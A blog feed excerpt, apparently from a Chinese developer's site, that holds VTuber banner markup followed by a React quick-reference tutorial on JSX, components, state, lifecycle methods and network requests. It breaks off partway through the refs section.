href="https://www.pixiv.net/artworks/70876364">            <div id="vBanner_post" title="Nekomasu Mikoko みここ" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/708763641_p0.png)"></div>        </a>        <div id="vLogo_Container">                            <div id="vBanner_name">Nekomasu Mikoko みここ</div>                    </div>    </div></div><div id="vBanner_Root">    <div id="vBanner_Container" style="background-image: linear-gradient(to bottom right, white ,#E6A0A9)">        <a href="https://www.pixiv.net/artworks/84727158">            <div id="vBanner_post" title="小希小桃" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/84727158_p01.png)"></div>        </a>        <div id="vLogo_Container">                                               <div id="vBanner_logo" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/xiaoxixiaotao.png)"></div>                                             </div>    </div></div><div id="vBanner_Root">    <div id="vBanner_Container" style="background-image: linear-gradient(to bottom right, white ,#E95371)">        <a href="">            <div id="vBanner_post" title="战斗吧歌姬" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/%E5%A4%8F%E6%97%A5%E6%97%85%E8%A1%8C.png)"></div>        </a>        <div id="vLogo_Container">                                               <div id="vBanner_logo" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/%E6%88%98%E6%96%97%E5%90%A7%E6%AD%8C%E5%A7%AClogo_tr.png)"></div>                                             </div>    </div></div><div id="vBanner_Root">    <div id="vBanner_Container" style="background-image: linear-gradient(to bottom right, white ,#4365ED)">        <a href="https://www.pixiv.net/artworks/83551905">            <div id="vBanner_post" title="七海Nana7mi" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/83551905_p01.png)"></div>        </a>        <div id="vLogo_Container">                            <div id="vBanner_name">七海Nana7mi</div>                    </div>    </div></div><div id="vBanner_Root">    <div id="vBanner_Container" style="background-image: linear-gradient(to bottom right, white ,#B3C6EC)">        <a href="">            <div id="vBanner_post" title="A-SOUL" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/ZZD7q421.png)"></div>        </a>        <div id="vLogo_Container">                                               <div id="vBanner_logo" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/A-SOUL.png)"></div>                                             </div>    </div></div>]]></content>
    
    
    <summary type="html">&lt;div id=&quot;vBanner_Root&quot;&gt;
    &lt;div id=&quot;vBanner_Container&quot; style=&quot;background-image: linear-gradient(to bottom right, white ,#EE4F87)&quot;&gt;
        &lt;a href=&quot;//www.deviantart.com/h4nip/art/Kizuna-Ai-GFX-Candy-Style-880025687&quot;&gt;
            &lt;div id=&quot;vBanner_post&quot; title=&quot;Kizuna AI&quot; style=&quot;background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/kizuna_ai__4k_uhd__by_assassinwarrior_dchk1rb.png)&quot;&gt;&lt;/div&gt;
        &lt;/a&gt;
        &lt;div id=&quot;vLogo_Container&quot;&gt;
            
                
                   &lt;div id=&quot;vBanner_logo&quot; style=&quot;background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/Logo_kizunaai_tp.png)&quot;&gt;&lt;/div&gt;     
                    
            
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;</summary>
    
    
    
    
    <category term="demo" scheme="https://mimonarchrd.gitee.io/tags/demo/"/>
    
  </entry>
  
  <entry>
    <title>React速查</title>
    <link href="https://mimonarchrd.gitee.io/2021/09/04/React%E9%80%9F%E6%9F%A5/"/>
    <id>https://mimonarchrd.gitee.io/2021/09/04/React%E9%80%9F%E6%9F%A5/</id>
    <published>2021-09-04T11:21:44.000Z</published>
    <updated>2021-09-17T01:38:36.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>React速记，分为3个部分。每一个部分由简短且精悍的知识点组成。开发忘记可查看，初见学习可常翻</p></blockquote><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="一、JSX"><a href="#一、JSX" class="headerlink" title="一、JSX"></a>一、JSX</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> element = <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, world!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure><p>JavaScript和UI代码的结合</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> element = <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure><p>用<code>&#123;&#125;</code>包裹表达式（js表达式，变量）</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> element = <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">className</span>=<span class="string">&#123;imgClass&#125;</span> <span class="attr">src</span>=<span class="string">&#123;user.avatarUrl&#125;</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure><ul><li><code>class</code>属性写为<code>className</code></li><li>属性用小驼峰语法</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> element = <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, world!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(</span><br><span class="line">  element,</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>一个可运行的React Hello World例子</p><span id="more"></span><h3 id="二、组件"><a href="#二、组件" class="headerlink" title="二、组件"></a>二、组件</h3><ol><li>类式组件</li><li>函数式组件</li></ol><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">MyComponent</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是用函数定义的组件(适用于【简单组件】的定义)<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> defualt <span class="keyword">class</span> <span class="title class_">MyComponent</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是用类定义的组件(适用于【复杂组件】的定义)<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>插入组件使用<code>import</code>，使用组件用 <strong>开头大写</strong> 的标签，组件可嵌套</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Hello</span> <span class="keyword">from</span> <span class="string">&#x27;./components/Hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">MyComponent</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Hello</span> /&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>渲染组件，ReactDOM的使用</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(</span><br><span class="line">  <span class="title class_">MyComponent</span>,</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="三、组件上的props和state"><a href="#三、组件上的props和state" class="headerlink" title="三、组件上的props和state"></a>三、组件上的props和state</h3><p>组件接收的入参为<code>props</code>，组件自身的状态为<code>state</code></p><h4 id="props"><a href="#props" class="headerlink" title="props"></a>props</h4><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Welcome</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;props.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传值</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> el = <span class="language-xml"><span class="tag">&lt;<span class="name">Welcome</span> <span class="attr">name</span>=<span class="string">&quot;嘉然&quot;</span> /&gt;</span></span></span><br></pre></td></tr></table></figure><p>传入值的类型检查，<code>PropTypes</code>的使用</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> propTypes = &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="title class_">PropTypes</span>.<span class="property">string</span>.<span class="property">isRequired</span>, <span class="comment">//限制name必传，且为字符串</span></span><br><span class="line">  <span class="attr">sex</span>:<span class="title class_">PropTypes</span>.<span class="property">string</span>,<span class="comment">//限制sex为字符串</span></span><br><span class="line">  <span class="attr">age</span>:<span class="title class_">PropTypes</span>.<span class="property">number</span>,<span class="comment">//限制age为数值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认值，<code>defaulyProps</code>的使用</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> defaultProps = &#123;</span><br><span class="line"><span class="attr">sex</span>: <span class="string">&quot;male&quot;</span>,</span><br><span class="line"><span class="attr">age</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>props</code>不可修改</p><h4 id="state"><a href="#state" class="headerlink" title="state"></a>state</h4><p><strong>函数式组件需借助<a href="%22https://mimonarchrd.gitee.io/React%E9%80%9F%E6%9F%A5/#Hooks%22">Hooks</a>使用state</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Weather</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>)&#123;</span><br><span class="line">    <span class="variable language_">super</span>(props)</span><br><span class="line">    <span class="comment">//初始化状态</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;<span class="attr">isHot</span>:<span class="literal">false</span>,<span class="attr">wind</span>:<span class="string">&#x27;微风&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不可以直接修改state，使用<code>setState()</code>修改</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;<span class="attr">isHot</span>:!isHot&#125;)</span><br></pre></td></tr></table></figure><h3 id="四、事件处理"><a href="#四、事件处理" class="headerlink" title="四、事件处理"></a>四、事件处理</h3><ol><li>事件处理回调</li><li><a href="">Ref</a></li></ol><p>类式组件里，在回调函数中要注意this指向的问题</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Toggle</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;<span class="attr">isToggleOn</span>: <span class="literal">true</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为了在回调中使用 `this`，这个绑定是必不可少的</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handleClick</span> = <span class="variable language_">this</span>.<span class="property">handleClick</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">handleClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(<span class="function"><span class="params">state</span> =&gt;</span> (&#123;</span><br><span class="line">      <span class="attr">isToggleOn</span>: !state.<span class="property">isToggleOn</span></span><br><span class="line">    &#125;));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.handleClick&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;this.state.isToggleOn ? &#x27;ON&#x27; : &#x27;OFF&#x27;&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数式组件</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ActionLink</span>(<span class="params"></span>) &#123;</span><br><span class="line">  handleClick = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;The link was clicked.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;handleClick&#125;</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="五、虚拟DOM、真实DOM"><a href="#五、虚拟DOM、真实DOM" class="headerlink" title="五、虚拟DOM、真实DOM"></a>五、虚拟DOM、真实DOM</h3><h4 id="虚拟DOM"><a href="#虚拟DOM" class="headerlink" title="虚拟DOM"></a>虚拟DOM</h4><p>开销极小的普通对象</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Velement</span> = <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Hello, world<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure><h4 id="真实DOM"><a href="#真实DOM" class="headerlink" title="真实DOM"></a>真实DOM</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Relement</span> = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;root&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="两者关系"><a href="#两者关系" class="headerlink" title="两者关系"></a>两者关系</h4><ul><li>调用<code>ReactDOM.render</code>将虚拟DOM渲染成真实DOM，组件state改变时，React会创建新VDOM并生成RDOM</li><li>虚拟DOM没有真实DOM过多的属性</li></ul><h3 id="六、Diff算法"><a href="#六、Diff算法" class="headerlink" title="六、Diff算法"></a>六、Diff算法</h3><p>对象差异比对调和（Reconciliation）算法</p><ul><li><p>虚拟DOM的比对</p></li><li><p>三种比对策略</p><ol><li>Tree Diff</li><li>Component Diff</li><li>Element Diff</li></ol><p>Tree Diff：DOM树的同层比对，跨层时，直接创建新节点及节点下的树</p><p><img src="https://static.xiaoblogs.cn/emoji/20210906104825.png"></p><p>Component Diff：</p><ul><li><p>不同类型组件：使用Tree Diff</p></li><li><p>同类型组件，比对 <strong>属性</strong> - <strong>子节点</strong> 子节点如根节点比对形式 <strong>属性</strong> - <strong>子节点</strong> 比对。碰到不同类型节点便使用Tree Diff规则。也可以使用 <strong>生命周期函数</strong> 来手动控制组件更新</p><p>不同类型组件</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Counter</span> /&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">Counter</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>同类型组件</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div className=<span class="string">&quot;before&quot;</span> title=<span class="string">&quot;stuff&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;after&quot;</span> <span class="attr">title</span>=<span class="string">&quot;stuff&quot;</span> /&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>first<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>second<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>first<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>second<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>third<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li></ul><p>Element Diff</p><p>节点在同一层级，会使用 <strong>删除、插入、移动</strong> 来更新</p><p>插入</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>first<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>first<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>second<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>每个节点带有key，避免 <strong>一些破坏渲染顺序的操作引发的性能问题</strong> </p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>first<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  &#123;/* React不会做移动操作更新ul下面的两个li，而是直接删除原来ul的li，生成新的两个li */&#125;</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>second<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>first<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>根据key判断原节点是否在原VDOM中存在</p></li></ul><h3 id="七、生命周期函数"><a href="#七、生命周期函数" class="headerlink" title="七、生命周期函数"></a>七、生命周期函数</h3><p>生命周期钩子，特定时刻执行</p><ul><li><strong>React16.4 旧生命周期</strong></li></ul><p><img src="https://static.xiaoblogs.cn/emoji/20210906112449.png"></p><p>初始化阶段: 由<code>ReactDOM.render()</code>触发—初次渲染</p><ol><li><code>constructor()</code></li><li><code>componentWillMount()</code></li><li><code>render()</code></li><li><code>componentDidMount()</code></li></ol><p>更新阶段: 由组件内部<code>this.setSate()</code>或父组件<code>render</code>触发</p><ol><li>   <code>shouldComponentUpdate()</code></li><li>   <code>componentWillUpdate()</code></li><li>   <code>render()</code></li><li>   <code>componentDidUpdate()</code></li></ol><p> 卸载组件: 由<code>ReactDOM.unmountComponentAtNode()</code>触发</p><p>​    <code>componentWillUnmount()</code></p><ul><li><strong>新生命周期</strong></li></ul><p><img src="https://static.xiaoblogs.cn/img/20210906112953.png"></p><ol><li><p>初始化阶段: 由<code>ReactDOM.render()</code>触发—初次渲染</p><ol><li> <code>constructor()</code></li><li><code>getDerivedStateFromProps()</code></li><li><code>render()</code></li><li><code>componentDidMount()</code></li></ol></li><li><p>更新阶段: 由组件内部<code>this.setSate()</code>或父组件重新<code>render</code>触发</p><ol><li><code>getDerivedStateFromProps()</code></li><li><code>shouldComponentUpdate()</code></li><li><code>render()</code></li><li><code>getSnapshotBeforeUpdate()</code></li><li><code>componentDidUpdate()</code></li></ol></li><li><p>卸载组件: 由<code>ReactDOM.unmountComponentAtNode()</code>触发</p><p>   <code>componentWillUnmount()</code></p></li></ol><p>PS.<strong>手动控制组件更新</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">shouldComponentUpdate</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="comment">//do something</span></span><br><span class="line">reture <span class="literal">true</span> <span class="comment">// 或者填写false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><h3 id="八、官方脚手架"><a href="#八、官方脚手架" class="headerlink" title="八、官方脚手架"></a>八、官方脚手架</h3><p><a href="https://reactjs.org/docs/create-a-new-react-app.html#create-react-app">Create a New React App – React (reactjs.org)</a></p><p>安装</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -s create-react-app</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create-react-app myapp</span><br></pre></td></tr></table></figure><h3 id="九、网络请求"><a href="#九、网络请求" class="headerlink" title="九、网络请求"></a>九、网络请求</h3><ul><li>axios</li><li>fetch</li></ul><h4 id="axios"><a href="#axios" class="headerlink" title="axios"></a>axios</h4><p><a href="http://www.axios-js.com/">axios中文网</a></p><p>简单使用实例</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">axios.<span class="title function_">get</span>(<span class="string">`/api1/users?q=<span class="subst">$&#123;keyWord&#125;</span>`</span>).<span class="title function_">then</span>(</span><br><span class="line">    <span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line"><span class="comment">// 成功请求后返回的响应</span></span><br><span class="line">    <span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//请求失败后的处理</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/fetch">MDN:WorkerOrGlobalScope.fetch()</a></p><p>实例</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fetch.<span class="title function_">get</span>(<span class="string">`/api1/users?q=<span class="subst">$&#123;keyWord&#125;</span>`</span>)</span><br><span class="line">.<span class="title function_">then</span>( <span class="function"><span class="params">resp</span> =&gt;</span> &#123;&#125; err =&gt; &#123;&#125;)</span><br><span class="line">.<span class="title function_">then</span>( <span class="title function_">resp</span>(data) =&gt; &#123;&#125; err =&gt; &#123;&#125;)</span><br></pre></td></tr></table></figure><p>async await语法</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">async</span>() =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> response= <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/api1/search/users2?q=<span class="subst">$&#123;keyWord&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>()   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="十、ref"><a href="#十、ref" class="headerlink" title="十、ref"></a>十、ref</h3><p>在React中获取DOM</p><p><code>ref.createRef()</code></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyComponent</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">myRef</span> = <span class="title class_">React</span>.<span class="title function_">createRef</span>();</span><br><span class="line">  